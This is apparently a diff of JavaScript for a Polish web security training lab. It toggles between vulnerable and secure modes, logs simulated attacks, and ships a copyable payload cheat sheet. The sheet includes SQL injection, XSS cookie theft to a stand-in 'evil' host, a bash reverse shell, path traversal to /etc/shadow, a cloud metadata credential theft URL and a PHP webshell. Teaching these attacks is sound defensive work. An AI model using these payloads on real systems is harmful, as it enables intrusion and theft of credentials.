+  wrap.style.cssText = "position:fixed;right:24px;bottom:24px;z-index:90;width:300px;background:rgba(255,255,255,.96);backdrop-filter:blur(12px);border:1px solid #fbcfe8;border-radius:18px;box-shadow:0 20px 60px rgba(236,72,153,.25);padding:16px;font-family:'M PLUS Rounded 1c',sans-serif;display:"+(tweaksOpen?"block":"none");
+  wrap.innerHTML = `
+    <div class="flex items-center justify-between mb-3">
+      <div class="font-extrabold text-sm">⚙️ Tweaks</div>
+      <button onclick="closeTweaks()" class="h-7 w-7 rounded-full bg-fuchsia-50 hover:bg-fuchsia-100 text-fuchsia-700 text-xs font-bold">✕</button>
+    </div>
+    <div class="space-y-3">
+      <div>
+        <label class="block text-xs font-bold uppercase tracking-wide text-slate-500 mb-1">Security mode</label>
+        <div class="flex gap-1 rounded-full bg-slate-100 p-1">
+          <button onclick="setSec(false)" class="flex-1 px-2 py-1.5 rounded-full text-xs font-bold ${!sec?'bg-gradient-to-r from-rose-400 to-orange-400 text-white shadow':'text-slate-600'}">⚠️ Vulnerable</button>
+          <button onclick="setSec(true)"  class="flex-1 px-2 py-1.5 rounded-full text-xs font-bold ${sec?'bg-gradient-to-r from-emerald-400 to-cyan-400 text-white shadow':'text-slate-600'}">🛡️ Secure</button>
+        </div>
+      </div>
+      <div>
+        <label class="flex items-center justify-between cursor-pointer">
+          <span class="text-sm font-semibold">Show mascot</span>
+          <input type="checkbox" id="tw-mascot" ${TWEAK_DEFAULTS.showMascot?"checked":""} onchange="toggleMascot(this.checked)" class="h-4 w-4">
+        </label>
+      </div>
+      <div class="pt-2 border-t border-fuchsia-100 grid grid-cols-2 gap-2">
+        <button onclick="quickLogin('admin')" class="rounded-lg bg-fuchsia-50 hover:bg-fuchsia-100 text-fuchsia-700 text-xs font-bold py-2">Quick: admin</button>
+        <button onclick="quickLogin('alice')" class="rounded-lg bg-fuchsia-50 hover:bg-fuchsia-100 text-fuchsia-700 text-xs font-bold py-2">Quick: alice</button>
+      </div>
+      <button onclick="resetState()" class="w-full rounded-lg bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-bold py-2">↻ Reset demo data</button>
+    </div>`;
+  document.body.appendChild(wrap);
+}
+function quickLogin(name){
+  const u = S.users.find(x=>x.username===name);
+  if(u){ S.session={username:u.username,role:u.role,id:u.id}; setFlash(`Logged in as @${u.username}`,false); save(); render(); }
+}
+function setSec(v){
+  S.securityEnabled = v;
+  TWEAK_DEFAULTS.securityEnabled = v;
+  save(); render();
+  if(window.parent !== window){
+    try{ window.parent.postMessage({type:'__edit_mode_set_keys', edits:{securityEnabled:v}}, '*'); }catch(e){}
+  }
+}
+function toggleMascot(v){
+  document.getElementById("anime-mascot").style.display = v ? "" : "none";
+  TWEAK_DEFAULTS.showMascot = v;
+  if(window.parent !== window){
+    try{ window.parent.postMessage({type:'__edit_mode_set_keys', edits:{showMascot:v}}, '*'); }catch(e){}
+  }
+}
+function openTweaks(){ tweaksOpen=true; const el=document.getElementById("tweaks-panel"); if(el) el.style.display="block"; else buildTweaks(); }
+function closeTweaks(){ tweaksOpen=false; const el=document.getElementById("tweaks-panel"); if(el) el.style.display="none"; if(window.parent!==window){try{ window.parent.postMessage({type:'__edit_mode_dismissed'},'*'); }catch(e){}} }
+
+window.addEventListener("message",(e)=>{
+  if(!e.data || !e.data.type) return;
+  if(e.data.type==="__activate_edit_mode") openTweaks();
+  if(e.data.type==="__deactivate_edit_mode") closeTweaks();
+});
+window.addEventListener("load",()=>{
+  if(window.parent!==window){
+    try{ window.parent.postMessage({type:'__edit_mode_available'},'*'); }catch(e){}
+  }
+});
+
+/* ============================================================
+   SAKURA PETALS
+============================================================ */
+(function spawnSakura(){
+  const layer = document.getElementById('sakura-canvas');
+  if(!layer) return;
+  function petal(){
+    const p = document.createElement('div');
+    p.className = 'petal';
+    const size = 8 + Math.random()*14;
+    p.style.width = size+'px'; p.style.height = size+'px';
+    p.style.left = (Math.random()*100)+'vw';
+    p.style.opacity = (0.45 + Math.random()*0.5).toFixed(2);
+    p.style.setProperty('--drift', ((Math.random()*220-110)|0)+'px');
+    const dur = 9 + Math.random()*9;
+    p.style.animation = `petalFall ${dur}s linear forwards`;
+    layer.appendChild(p);
+    setTimeout(()=>p.remove(), dur*1000+200);
+  }
+  setInterval(petal, 700);
+  for(let i=0;i<6;i++) setTimeout(petal, i*120);
+})();
+
+/* ============================================================
+   REQUEST INSPECTOR + ATTACK TIMELINE
+============================================================ */
+const REQ_LOG = [];
+const ATK_LOG = [];
+function logRequest({method, path, headers={}, body=null, status=200, blocked=false, note=""}){
+  const t = new Date();
+  const elapsed = (12 + Math.random()*180)|0;
+  const entry = {id: Date.now()+Math.random(), t, method, path, headers, body, status, blocked, note, elapsed};
+  REQ_LOG.unshift(entry);
+  if(REQ_LOG.length>60) REQ_LOG.pop();
+  renderReqs();
+  return entry;
+}
+function logAttack({vuln, payload, success, note=""}){
+  const t = new Date();
+  ATK_LOG.unshift({id:Date.now()+Math.random(), t, vuln, payload, success, note, mode:S.securityEnabled?"secure":"vulnerable", who:S.session?S.session.username:"anon"});
+  if(ATK_LOG.length>50) ATK_LOG.pop();
+  renderAtks();
+  if(success) achievement(`💥 ${vuln} pwned!`);
+  else if(S.securityEnabled) achievement(`🛡️ ${vuln} blocked`);
+}
+function fmtTime(d){return d.toTimeString().slice(0,8)+"."+String(d.getMilliseconds()).padStart(3,"0")}
+function renderReqs(){
+  document.getElementById("reqs-count").textContent = REQ_LOG.length;
+  const list = document.getElementById("reqs-list");
+  if(!list) return;
+  list.innerHTML = REQ_LOG.slice(0,15).map(r=>{
+    const pillClass = r.blocked?"pill-403":r.note==="pwn"?"pill-pwn":r.status>=400?"pill-403":"pill-200";
+    return `<div class="hud-row method-${r.method}" onclick="showReq(${r.id})">
+      <div style="display:flex;align-items:center;gap:8px">
+        <span class="pill" style="background:#f3f4f6;color:#111">${r.method}</span>
+        <span style="flex:1;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(r.path)}</span>
+        <span class="pill ${pillClass}">${r.blocked?"BLOCK":r.status}</span>
+      </div>
+      <div style="color:#9ca3af;font-size:10px;margin-top:2px">${fmtTime(r.t)} • ${r.elapsed}ms</div>
+    </div>`;
+  }).join("") || `<div style="color:#9ca3af;text-align:center;padding:18px;font-size:11px">No requests yet — interact with the app.</div>`;
+}
+function showReq(id){
+  const r = REQ_LOG.find(x=>x.id===id); if(!r) return;
+  const detail = document.getElementById("reqs-detail");
+  const headerLines = Object.entries(r.headers).map(([k,v])=>`${k}: ${v}`).join("\n");
+  detail.style.display = "block";
+  detail.innerHTML = `<span class="info">${r.method} ${escapeHtml(r.path)} HTTP/1.1</span>
+<span class="dim">${escapeHtml(headerLines)}</span>
+${r.body?`\n${escapeHtml(typeof r.body==="string"?r.body:JSON.stringify(r.body,null,2))}`:""}
+
+<span class="${r.blocked?'err':'ok'}">← HTTP/1.1 ${r.blocked?"403 Forbidden":r.status+" OK"}</span>
+<span class="dim">x-elapsed: ${r.elapsed}ms${r.note?"\nx-bai-note: "+r.note:""}</span>`;
+}
+function renderAtks(){
+  document.getElementById("atk-count").textContent = ATK_LOG.length;
+  const list = document.getElementById("atk-list");
+  if(!list) return;
+  list.innerHTML = ATK_LOG.slice(0,20).map(a=>{
+    const cls = a.success ? "pill-pwn" : "pill-blocked";
+    const lbl = a.success ? "PWND" : "BLOCKED";
+    return `<div class="hud-row" style="border-left:3px solid ${a.success?'#f59e0b':'#3b82f6'}">
+      <div style="display:flex;gap:6px;align-items:center;margin-bottom:3px">
+        <span class="pill" style="background:#fce7f3;color:#831843">${a.vuln}</span>
+        <span class="pill ${cls}">${lbl}</span>
+        <span style="margin-left:auto;color:#9ca3af;font-size:10px">${fmtTime(a.t)}</span>
+      </div>
+      <div style="color:#374151;word-break:break-all">${escapeHtml(a.payload).slice(0,160)}</div>
+      <div style="color:#9ca3af;font-size:10px;margin-top:2px">@${escapeHtml(a.who)} • ${a.mode}${a.note?" • "+escapeHtml(a.note):""}</div>
+    </div>`;
+  }).join("") || `<div style="color:#9ca3af;text-align:center;padding:18px;font-size:11px">No attacks attempted yet.</div>`;
+}
+function toggleHud(id){
+  const body = document.getElementById(id==="hud-requests"?"reqs-body":"atk-body");
+  body.style.display = body.style.display==="none" ? "block" : "none";
+}
+function exportPoC(){
+  const lines = ["# BAI Lab — PoC report","","Generated: "+new Date().toISOString(),"",`## Attacks (${ATK_LOG.length})`,""];
+  ATK_LOG.slice().reverse().forEach((a,i)=>{
+    lines.push(`### ${i+1}. ${a.vuln} — ${a.success?"✅ succeeded":"🛡 blocked"}`);
+    lines.push(`- mode: \`${a.mode}\`  user: \`${a.who}\`  time: ${a.t.toISOString()}`);
+    lines.push("- payload:");
+    lines.push("```");
+    lines.push(a.payload);
+    lines.push("```");
+    if(a.note) lines.push(`- note: ${a.note}`);
+    lines.push("");
+  });
+  const blob = new Blob([lines.join("\n")], {type:"text/markdown"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob); a.download = "bai-lab-poc.md"; a.click();
+}
+
+/* ============================================================
+   ACHIEVEMENT TOAST
+============================================================ */
+function achievement(text){
+  const t = document.createElement("div");
+  t.style.cssText = "position:fixed;top:80px;left:50%;transform:translateX(-50%) translateY(-20px);z-index:120;background:linear-gradient(135deg,#fbbf24,#ec4899);color:#fff;font-weight:800;padding:12px 22px;border-radius:9999px;box-shadow:0 12px 40px rgba(236,72,153,.4);opacity:0;transition:all .3s;font-family:'M PLUS Rounded 1c',sans-serif;font-size:14px";
+  t.textContent = text;
+  document.body.appendChild(t);
+  requestAnimationFrame(()=>{ t.style.opacity="1"; t.style.transform="translateX(-50%) translateY(0)"; });
+  setTimeout(()=>{ t.style.opacity="0"; t.style.transform="translateX(-50%) translateY(-20px)"; setTimeout(()=>t.remove(),320); }, 2400);
+}
+
+/* ============================================================
+   MASCOT SPEECH BUBBLES
+============================================================ */
+const VULN_TIPS = [
+  "uważaj na te apostrofy! 🍡",
+  "spróbuj ' OR 1=1 -- 💉",
+  "<scr"+"ipt>alert(1)</scr"+"ipt> w komentarzu! 🪤",
+  "ID w URL też wygląda kusząco… 🔓",
+  "shellem trąca: ; cat /etc/passwd 💻",
+  "GET /api/users — hasła czekają 🗝️",
+];
+const SECURE_TIPS = [
+  "wszystko sparametryzowane ✓",
+  "CSP gotowe, XSS odbity 🛡️",
+  "CSRF token waży to żądanie 🔐",
+  "bcrypt > plaintext, zawsze 🌸",
+  "SameSite=Lax, ciasteczka pilnują się same",
+];
+function speakMascot(){
+  const el = document.getElementById("anime-mascot");
+  if(!el || el.style.display==="none") return;
+  const tips = S.securityEnabled ? SECURE_TIPS : VULN_TIPS;
+  const text = tips[(Math.random()*tips.length)|0];
+  const r = el.getBoundingClientRect();
+  const b = document.createElement("div");
+  b.className = "speech-bubble";
+  b.textContent = text;
+  b.style.left = Math.max(8, r.left - 180)+"px";
+  b.style.top = Math.max(8, r.top - 14)+"px";
+  document.body.appendChild(b);
+  setTimeout(()=>b.remove(), 5000);
+}
+setInterval(speakMascot, 9000);
+setTimeout(speakMascot, 1800);
+
+function applyModeClass(){
+  document.body.classList.toggle("sec-vuln", !S.securityEnabled);
+  document.body.classList.toggle("sec-secure", S.securityEnabled);
+}
+
+/* ============================================================
+   CHEATSHEET
+============================================================ */
+const CHEATS = [
+  {title:"💉 SQL Injection", cwe:"CWE-89 / OWASP A03",
+   what:"Wstrzyknięcie SQL przez nieoczyszczony input łączony stringiem do zapytania.",
+   detect:"' zwraca 500. '-- zmienia zachowanie. sleep() zwleka odpowiedź.",
+   defense:["Prepared statements / parametry (?, $1)","ORM (sqlx, gorm)","Whitelist sortowania/kolumn","Least-privilege DB user","WAF jako defense-in-depth"],
+   payloads:[
+     ["Auth bypass","' OR 1=1 --"],
+     ["Auth bypass v2","admin' --"],
+     ["Tautologia","' OR '1'='1"],
+     ["UNION dump","' UNION SELECT 1,username,password,1,1 FROM users --"],
+     ["Liczba kolumn","' ORDER BY 6 --"],
+     ["Stos zapytań","1; DROP TABLE posts --"],
+     ["Time-based blind","' OR sleep(5) --"],
+     ["Boolean blind","' AND substr(password,1,1)='a' --"],
+     ["Enum (SQLite)","' UNION SELECT name,sql,1,1,1 FROM sqlite_master --"],
+     ["Enum (Postgres)","'; SELECT current_database() --"],
+   ]},
+  {title:"🪤 Cross-Site Scripting (XSS)", cwe:"CWE-79 / OWASP A03",
+   what:"Wstrzyknięcie JS w stronę renderowaną innej osobie (Stored / Reflected / DOM).",
+   detect:"Komentarz/tytuł renderowany jako raw HTML. Brak Content-Security-Policy.",
+   defense:["Auto-escape w szablonach (Templ {x} a nie {!x!})","CSP: script-src 'self'","HttpOnly+Secure cookie","X-Content-Type-Options: nosniff","Sanitizer (bluemonday)"],
+   payloads:[
+     ["Klasyk","<scr"+"ipt>alert('XSS')</scr"+"ipt>"],
+     ["Bez script","<img src=x onerror=alert(1)>"],
+     ["SVG","<svg onload=alert(document.cookie)>"],
+     ["Kradzież cookie","<scr"+"ipt>fetch('https://evil/?c='+document.cookie)</scr"+"ipt>"],
+     ["Atrybut","\" onmouseover=alert(1) x=\""],
+     ["javascript: URL","javascript:alert(1)"],
+     ["Filter bypass","<scR"+"iPt>alert(1)</scR"+"iPt>"],
+     ["Polyglot","jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"],
+   ]},
+  {title:"🔓 Broken Access Control / IDOR", cwe:"CWE-639 / OWASP A01",
+   what:"Brak weryfikacji własności zasobu — manipulacja ID w URL ujawnia/edytuje cudze dane.",
+   detect:"URL z liczbowym ID. Brak 403 po podmianie. Role w cookie/JWT bez weryfikacji.",
+   defense:["ownerId == session.userId na serwerze","UUID zamiast int","Middleware RBAC","Deny by default","Test każdego endpointu jako gość/user/admin"],
+   payloads:[
+     ["Sekwencyjny ID","/posts/edit/2"],
+     ["Inkrementacja","/api/users/1, /api/users/2 ..."],
+     ["Force browse","/admin (jako user)"],
+     ["JWT alg=none","eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."],
+     ["JWT swap","Zmień \"role\":\"user\" → \"admin\""],
+     ["Method tamper","GET /admin → POST /admin"],
+   ]},
+  {title:"📁 Path Traversal / LFI", cwe:"CWE-22 / OWASP A01",
+   what:"Odczyt plików spoza katalogu uploads przez ../ w nazwie pliku.",
+   detect:"Endpoint zwraca treść po podaniu ścieżki względnej w parametrze.",
+   defense:["filepath.Clean + strings.HasPrefix(uploadDir)","Whitelist rozszerzeń","Random UUID jako nazwa","chroot / fs sandbox"],
+   payloads:[
+     ["Linux passwd","../../../etc/passwd"],
+     ["Linux shadow","../../../../etc/shadow"],
+     ["URL encoded","..%2f..%2f..%2fetc%2fpasswd"],
+     ["Double encoded","..%252f..%252fetc%252fpasswd"],
+     ["Null byte (legacy)","../../etc/passwd%00.png"],
+     ["Windows","..\\..\\..\\windows\\win.ini"],
+     ["App config","../../app.db"],
+     [".env","../../.env"],
+   ]},
+  {title:"💻 Command Injection", cwe:"CWE-78 / OWASP A03",
+   what:"Inputy łączone do sh -c — metaznaki rozdzielają polecenia.",
+   detect:"; && | $() ` w polu typu host/IP daje dodatkowy output.",
+   defense:["exec.Command(\"ping\",\"-c1\",host) — bez sh","Regex ^[a-zA-Z0-9.-]+$","Whitelist argumentów","Drop privileges (non-root)"],
+   payloads:[
+     ["Średnik","8.8.8.8 ; cat /etc/passwd"],
+     ["Logiczny AND","127.0.0.1 && whoami"],
+     ["Subshell $()","8.8.8.8 ; echo $(id)"],
+     ["Backticks","8.8.8.8 ; echo `uname -a`"],
+     ["Pipe","8.8.8.8 | nc evil 4444"],
+     ["Reverse shell","; bash -i >& /dev/tcp/evil/4444 0>&1"],
+     ["Newline","8.8.8.8%0acat /etc/passwd"],
+     ["Bypass spaces","cat${IFS}/etc/passwd"],
+   ]},
+  {title:"🌐 SSRF", cwe:"CWE-918 / OWASP A10",
+   what:"Serwer pobiera URL podany przez usera — atak idzie z zaufanego IP serwera.",
+   detect:"Endpoint typu /fetch?url= albo image proxy.",
+   defense:["Whitelist domen","Blokuj 127/8, 169.254/16, 10/8, 192.168/16","Disable redirects","Osobny kontener bez sieci wewn."],
+   payloads:[
+     ["Localhost","http://127.0.0.1:8080/admin"],
+     ["IPv6 loopback","http://[::1]/admin"],
+     ["Decimal IP","http://2130706433/  /* = 127.0.0.1 */"],
+     ["AWS IMDS","http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+     ["GCP IMDS","http://metadata.google.internal/computeMetadata/v1/"],
+     ["file://","file:///etc/passwd"],
+     ["gopher RCE","gopher://127.0.0.1:6379/_FLUSHALL"],
+     ["DNS rebind","http://attacker-dns.tld/"],
+   ]},
+  {title:"🛂 CSRF", cwe:"CWE-352 / OWASP A01",
+   what:"Cudza strona zmusza zalogowaną ofiarę do żądania zmieniającego stan.",
+   detect:"POST bez tokena CSRF, ciasteczko bez SameSite.",
+   defense:["Token CSRF na każdym POST/PUT/DELETE","Cookie SameSite=Lax/Strict","Origin/Referer check","Custom header X-Requested-With"],
+   payloads:[
+     ["Auto-submit","<form id=f action=https://victim/users/me/password method=POST><input name=new_password value=pwn></form><scr"+"ipt>f.submit()</scr"+"ipt>"],
+     ["Image GET","<img src='https://victim/transfer?to=evil&amount=999'>"],
+     ["JSON fetch","fetch('https://victim/api',{method:'POST',credentials:'include',body:'{}'})"],
+   ]},
+  {title:"🔐 Broken Authentication", cwe:"CWE-287 / OWASP A07",
+   what:"Słabe hasła, brute-force, brak rate-limit, sesja w URL, predictable tokens.",
+   detect:"Brak limitu prób, długie sesje, /reset?token=123.",
+   defense:["bcrypt/argon2id (cost ≥ 12)","Rate limit + lockout (5/min)","2FA/TOTP","Rotate session on login","Sliding expiry"],
+   payloads:[
+     ["Top 10 haseł","admin, password, 123456, qwerty, letmein, welcome, admin123, root, toor, changeme"],
+     ["Hydra","hydra -l admin -P rockyou.txt http-post-form"],
+     ["Session fixation","Cookie: session=AAAA  /* zalogowanie nie rotuje */"],
+     ["Reset enum","/reset?token=1, ?token=2 ..."],
+   ]},
+  {title:"🗝️ Sensitive Data Exposure", cwe:"CWE-200 / OWASP A02",
+   what:"Plain-text hasła, API keys w repo, brak HTTPS, debug stack-trace na produkcji.",
+   detect:"GET /api/users zwraca 'password', .env w gh, response 500 z ścieżkami.",
+   defense:["bcrypt hash w DB","Secrets w env/Vault","HSTS + TLS 1.2+","gin.SetMode(ReleaseMode)","Strip stack traces"],
+   payloads:[
+     ["Endpoint dump","GET /api/users"],
+     ["Backup","/.git/config, /backup.sql, /dump.zip"],
+     ["Source maps","/static/app.js.map"],
+     ["Error oracle","GET /posts/abc → SQL error w response"],
+   ]},
+  {title:"🛠️ Security Misconfiguration", cwe:"CWE-16 / OWASP A05",
+   what:"Default creds, listing katalogów, debug=true, otwarte porty admin.",
+   detect:"/debug/pprof, X-Powered-By, brak nagłówków bezp.",
+   defense:["Wyłącz debug","Nagłówki: CSP, HSTS, X-Frame-Options DENY, Referrer-Policy","Minimalne porty","govulncheck w CI"],
+   payloads:[
+     ["Go pprof","/debug/pprof/heap"],
+     ["Listing","/uploads/"],
+     ["Default","/admin/admin"],
+     ["Header sniff","curl -I https://victim"],
+   ]},
+  {title:"📥 File Upload", cwe:"CWE-434 / OWASP A04",
+   what:"Upload bez walidacji typu/nazwy → RCE przez .php/.jsp/.go bądź XSS przez .svg/.html.",
+   detect:"Nazwa zachowana 1:1, brak Content-Type sniff, plik dostępny przez /uploads/x.html.",
+   defense:["Random UUID jako nazwa","Sniff bytes (http.DetectContentType)","Limit rozmiaru","Osobna domena + Content-Disposition: attachment","Skanuj antywirusem"],
+   payloads:[
+     ["Polyglot SVG","<svg xmlns='http://www.w3.org/2000/svg'><scr"+"ipt>alert(1)</scr"+"ipt></svg>"],
+     ["HTML stored XSS","evil.html → /uploads/evil.html w iframe"],
+     ["Webshell PHP","<?php system($_GET['c']); ?>"],
+     ["Double ext","shell.php.png"],
+     ["Path w nazwie","../../etc/cron.d/evil"],
+   ]},
+  {title:"📋 Burp Suite — szybki start", cwe:null,
+   what:"Proxy HTTP do przechwytywania i modyfikacji żądań. Workflow obrony.",
+   detect:null,
+   defense:null,
+   payloads:[
+     ["Proxy","127.0.0.1:8080  +  CA cert"],
+     ["Repeater","Ctrl+R — wyślij żądanie kilka razy z modyfikacjami"],
+     ["Intruder","Sniper — bruteforce 1 param.; Cluster bomb — wiele param."],
+     ["Decoder","Base64 / URL / HTML encode/decode"],
+     ["Comparer","diff dwóch response'ów"],
+     ["Match&Replace","Auto-modyfikuj nagłówki w przelocie"],
+   ]},
+  {title:"📚 Mini-glosariusz", cwe:null,
+   what:"Skróty których możesz potrzebować podczas obrony.",
+   detect:null,
+   defense:null,
+   payloads:[
+     ["CSP","Content-Security-Policy — biała lista źródeł skryptów/styli."],
+     ["CORS","Cross-Origin Resource Sharing — kto może czytać response cross-origin."],
+     ["SOP","Same-Origin Policy — domyślna izolacja origin (scheme+host+port)."],
+     ["bcrypt","Adaptive hash z saltem; cost factor (work)."],
+     ["SameSite","Atrybut cookie: Strict / Lax / None."],
+     ["CWE","Common Weakness Enumeration — taksonomia (CWE-89=SQLi)."],
+     ["OWASP T10","A01:BAC, A02:Crypto, A03:Inj, A04:Design, A05:Misconfig, A07:Auth, A10:SSRF."],
+     ["Defense in depth","Wiele warstw — żeby obejście jednej nie kosztowało wszystkiego."],
+   ]},
+];
+let cheatFilter = "";
+function buildCheatSheet(){
+  const body = document.getElementById("cheat-body");
+  if(!body) return;
+  const f = cheatFilter.toLowerCase();
+  const matches = CHEATS.filter(c=>!f || (c.title+(c.what||"")+(c.detect||"")+(c.defense||[]).join(" ")+JSON.stringify(c.payloads)).toLowerCase().includes(f));
+  body.innerHTML = `
+    <div class="sticky top-0 z-10 bg-white/95 backdrop-blur pb-3 mb-2 -mx-1 px-1 border-b border-fuchsia-100">
+      <input id="cheat-search" type="search" placeholder="🔎 Filtruj (sql, xss, csrf, jwt...)" value="${escapeHtml(cheatFilter)}"
+        oninput="cheatFilter=this.value;buildCheatSheet();setTimeout(()=>{const i=document.getElementById('cheat-search');if(i){i.focus();i.setSelectionRange(i.value.length,i.value.length);}},0)"
+        class="w-full rounded-xl border border-fuchsia-200 bg-white px-3 py-2 text-sm outline-none focus:border-pink-400 focus:ring-2 focus:ring-pink-100">
+      <p class="text-[10px] text-slate-500 mt-1.5 leading-tight">Każda sekcja: <strong>co to</strong> · <strong>jak wykryć</strong> · <strong>obrona</strong> · payloady (klik=kopiuj). ${matches.length}/${CHEATS.length} sekcji.</p>
+    </div>
+  ` + matches.map((c)=>{
+      const payloadsHtml = c.payloads.map(([label,p])=>{
+        const safeP = JSON.stringify(p).replace(/"/g,"&quot;");
+        return `<div class="mb-2">
+          <div class="text-[10px] font-bold uppercase tracking-wider text-fuchsia-700 mb-1">${escapeHtml(label)}</div>
+          <button class="copy-btn" onclick="copyPayload(this, ${safeP})">${escapeHtml(p)}</button>
+        </div>`;
+      }).join("");
+      return `<details class="rounded-xl border border-fuchsia-100 bg-fuchsia-50/40 overflow-hidden mb-2" ${f?"open":""}>
+        <summary class="px-3 py-2.5 font-extrabold text-sm text-slate-800 hover:bg-fuchsia-50 flex items-center justify-between gap-2">
+          <span>${c.title}</span>${c.cwe?`<span class="text-[9px] font-mono font-normal text-fuchsia-500 whitespace-nowrap">${escapeHtml(c.cwe)}</span>`:""}
+        </summary>
+        <div class="px-3 pb-3 pt-1 space-y-3">
+          ${c.what?`<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-fuchsia-700">Co to:</strong> ${escapeHtml(c.what)}</div>`:""}
+          ${c.detect?`<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-amber-700">Jak wykryć:</strong> ${escapeHtml(c.detect)}</div>`:""}
+          ${c.defense?`<div class="text-xs text-slate-700 leading-relaxed"><strong class="text-emerald-700">Obrona:</strong><ul class="list-disc list-inside mt-1 space-y-0.5 marker:text-emerald-400">${c.defense.map(d=>`<li>${escapeHtml(d)}</li>`).join("")}</ul></div>`:""}
+          <div class="pt-2 border-t border-fuchsia-100">${payloadsHtml}</div>
+        </div>
+      </details>`;
+    }).join("") + (matches.length===0?`<p class="text-sm text-slate-500 text-center py-8">Brak wyników dla "${escapeHtml(cheatFilter)}"</p>`:"");
+}
+function copyPayload(btn, text){
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.classList.add("copied");
+    setTimeout(()=>btn.classList.remove("copied"), 1400);
+  });
+}
+function toggleCheat(){
+  document.getElementById("cheat-drawer").classList.toggle("open");
+}
+buildCheatSheet();
+
+/* ============================================================
+   SKELETON LOADER for posts refresh
+============================================================ */
+function postsSkeleton(n=3){
+  let h = `<div id="posts-list" class="grid gap-4 sm:gap-6">`;
+  for(let i=0;i<n;i++){
+    h += `<article class="rounded-2xl border border-fuchsia-100 bg-white/90 p-6">
+      <div class="flex items-start justify-between gap-4 mb-3">
+        <div class="flex-1 space-y-2">
+          <div class="skeleton h-5 w-2/3"></div>
+          <div class="skeleton h-3 w-1/3"></div>
+        </div>
+        <div class="skeleton h-6 w-20 rounded-full"></div>
+      </div>
+      <div class="space-y-2 mb-4">
+        <div class="skeleton h-3 w-full"></div>
+        <div class="skeleton h-3 w-11/12"></div>
+        <div class="skeleton h-3 w-3/4"></div>
+      </div>
+      <div class="pt-4 border-t border-fuchsia-100">
+        <div class="skeleton h-4 w-24"></div>
+      </div>
+    </article>`;
+  }
+  return h+"</div>";
+}
+function refreshPostsAnimated(){
+  const c = document.getElementById("posts-container");
+  if(!c) return render();
+  c.innerHTML = postsSkeleton();
+  logRequest({method:"GET", path:"/ui/partials/posts", headers:{"HX-Request":"true","Accept":"text/html"}, status:200});
+  setTimeout(()=>{ render(); }, 700);
+}
+
+/* ============================================================
+   HOOK: log requests for app actions
+============================================================ */
+const _origSubmitLogin = submitLogin;
+submitLogin = function(e){
+  const fd = new FormData(e.target);
+  const u = (fd.get("username")||"").toString();
+  const p = (fd.get("password")||"").toString();
+  const sqliAttempt = /'\s*OR\s*'1'\s*=\s*'1|'\s*OR\s*1\s*=\s*1|'--/i.test(u+p);
+  logRequest({method:"POST", path:"/ui/login", headers:{"Content-Type":"application/x-www-form-urlencoded","Cookie":S.session?`session=${S.session.username}`:""}, body:`username=${u}&password=${"*".repeat(p.length)}`, status:sqliAttempt && !S.securityEnabled?200:S.securityEnabled?(S.users.find(x=>x.username===u&&x.password===p)?200:401):200, note:sqliAttempt && !S.securityEnabled?"pwn":""});
+  if(sqliAttempt) logAttack({vuln:"SQLi (login)", payload:`u=${u} / p=${p}`, success:!S.securityEnabled, note:S.securityEnabled?"prepared statement":"auth bypass"});
+  return _origSubmitLogin(e);
+};
+const _origRunSqli = runSqli;
+runSqli = function(e){
+  const q = document.getElementById("sqli-input").value;
+  logRequest({method:"GET", path:"/api/search-vulnerable?q="+encodeURIComponent(q), headers:{Accept:"application/json"}, status:200, note: !S.securityEnabled && /UNION|OR\s*1=1/i.test(q) ? "pwn":""});
+  logAttack({vuln:"SQLi", payload:q, success: !S.securityEnabled && /UNION|OR\s*1=1|--/i.test(q), note: S.securityEnabled?"parameterized":"concat"});
+  return _origRunSqli(e);
+};
+const _origRunCmd = runCmd;
+runCmd = function(e){
+  const v = document.getElementById("cmd-input").value;
+  const inj = /[;&|`$]/.test(v);
+  logRequest({method:"POST", path:"/api/admin/ping", headers:{"Content-Type":"application/json"}, body:JSON.stringify({host:v}), status:S.securityEnabled&&inj?400:200, blocked:S.securityEnabled&&inj, note:!S.securityEnabled&&inj?"pwn":""});
+  logAttack({vuln:"CmdInjection", payload:v, success:!S.securityEnabled&&inj, note:S.securityEnabled?"regex validated":"sh -c"});
+  return _origRunCmd(e);
+};
+const _origRunCsrf = runCsrf;
+runCsrf = function(e){
+  logRequest({method:"POST", path:"/users/me/password", headers:{"Origin":"https://evil.example.com","Cookie":S.session?`session=${S.session.username}`:"(none)"}, body:"new_password=pwn3d-by-evil", status:S.securityEnabled?403:200, blocked:S.securityEnabled, note:!S.securityEnabled&&S.session?"pwn":""});
+  logAttack({vuln:"CSRF", payload:"POST /users/me/password from evil.example.com", success: !S.securityEnabled && !!S.session, note:S.securityEnabled?"token + SameSite":"no token"});
+  return _origRunCsrf(e);
+};
+const _origSubmitComment = submitComment;
+submitComment = function(e, postId){
+  const body = (new FormData(e.target).get("body")||"").toString();
+  const xss = /<scr|onerror|onload|<svg|<img\s|javascript:/i.test(body);
+  logRequest({method:"POST", path:`/posts/${postId}/comments`, headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:`body=${body.slice(0,80)}`, status:200, note:!S.securityEnabled&&xss?"pwn":""});
+  if(xss) logAttack({vuln:"XSS (stored)", payload:body, success:!S.securityEnabled, note:S.securityEnabled?"escaped":"raw render"});
+  return _origSubmitComment(e, postId);
+};
+const _origDeletePost = deletePost;
+deletePost = function(id){
+  const p = S.posts.find(x=>x.id===id);
+  if(p){
+    const idor = S.session && p.author_id !== S.session.id && S.session.role !== "admin";
+    logRequest({method:"DELETE", path:`/posts/${id}`, headers:{"Cookie":S.session?`session=${S.session.username}`:""}, status:S.securityEnabled&&idor?403:200, blocked:S.securityEnabled&&idor, note:!S.securityEnabled&&idor?"pwn":""});
+    if(idor) logAttack({vuln:"IDOR (delete)", payload:`DELETE /posts/${id} (author=${p.author_id}, you=${S.session.id})`, success:!S.securityEnabled, note:S.securityEnabled?"ownership check":"no check"});
+  }
+  return _origDeletePost(id);
+};
+
+/* Hook setSec to update aura */
+const _origSetSec = setSec;
+setSec = function(v){ _origSetSec(v); applyModeClass(); };
+
+/* Patch posts page refresh button to use skeleton */
+const _origPagePosts = pagePosts;
